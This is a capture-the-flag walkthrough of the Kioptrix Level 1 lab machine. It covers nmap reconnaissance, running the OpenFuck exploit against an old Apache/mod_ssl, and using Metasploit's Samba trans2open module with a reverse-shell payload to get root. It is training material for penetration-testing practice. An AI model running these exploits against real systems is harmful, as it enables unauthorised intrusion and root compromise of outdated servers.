# Kioptrix Level 1

### Contents
<!-- TOC -->
- [Footprinting](#footprinting)
- [Reconnaisance](#reconnaisance)
- [SSH](#ssh)
- [HTTP](#http)
- [RPC & filenet](#rpc--filenet)
- [NetBIOS](#netbios)
  - [Metasploit Exploitation](#metasploit-exploitation)

<!-- /TOC -->

# Footprinting
Find the IP address of the target host via:

```bash
netdiscover -r 10.0.0.0/24
```

For the purpose of this guide we will assume our target is at IP address **10.0.0.3**.

# Reconnaisance
```bash
nmap 10.0.0.3
```
```
PORT      STATE SERVICE
22/tcp    open  ssh
80/tcp    open  http
111/tcp   open  rpcbind
139/tcp   open  netbios-ssn
443/tcp   open  https
32768/tcp open  filenet-tms
MAC Address: 08:00:27:BC:A2:66 (Oracle VirtualBox virtual NIC)
```
Now we proceed by examining each of the services on the machine.

# SSH
```bash
nmap -A 10.0.0.3 -p 22
```

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 2.9p2 (protocol 1.99)
| ssh-hostkey:
|   1024 b8:74:6c:db:fd:8b:e6:66:e9:2a:2b:df:5e:6f:64:86 (RSA1)
|   1024 8f:8e:5b:81:ed:21:ab:c1:80:e1:57:a3:3c:85:c4:71 (DSA)
|_  1024 ed:4e:a9:4a:06:14:ff:15:14:ce:da:3a:80:db:e2:81 (RSA)
|_sshv1: Server supports SSHv1
MAC Address: 08:00:27:BC:A2:66 (Oracle VirtualBox virtual NIC)
```

Analysis of the SSH version and some brute force attempts using hydra do yield any success.
However, it should be noted that the support of SSHv1 is strongly discouraged as it has inherent weaknesses.

# HTTP
```
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)
| http-methods:
|   Supported Methods: GET HEAD OPTIONS TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b
|_http-title: Test Page for the Apache Web Server on Red Hat Linux
```
Following this ```dirbuster``` was used to enumerate directories and locations.
No specific locations were found.

Analysis of the HTTPD version revealed the ```OpenFuck``` vulnerability was present.

```bash
./OpenFuck 0x6b 10.0.0.3
```

Find more details at: https://www.exploit-db.com/exploits/764.

This gives root once executed against the target.

# RPC & filenet
Neither of these services yielded much.

No vulnerabilities were found for either.

Port ```32768``` seemed to be associated to trojans, with little context.

# NetBIOS

We used Metasploit instead of enum4linux due to version detection bugs.

```powershell
msf auxiliary(scanner/smb/smb_version) > run
[*] 10.0.2.7:139          - Host could not be identified: Unix (Samba 2.2.1a)
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf auxiliary(scanner/smb/smb_version) >
```
Based on the SAMBA version of **2.2.1a** the following was found: https://www.exploit-db.com/exploits/10.

## Metasploit Exploitation

Using msf we were able to gain root:

```
use exploit/linux/samba/trans2open

set payload linux/x86/shell/reverse_tcp
```
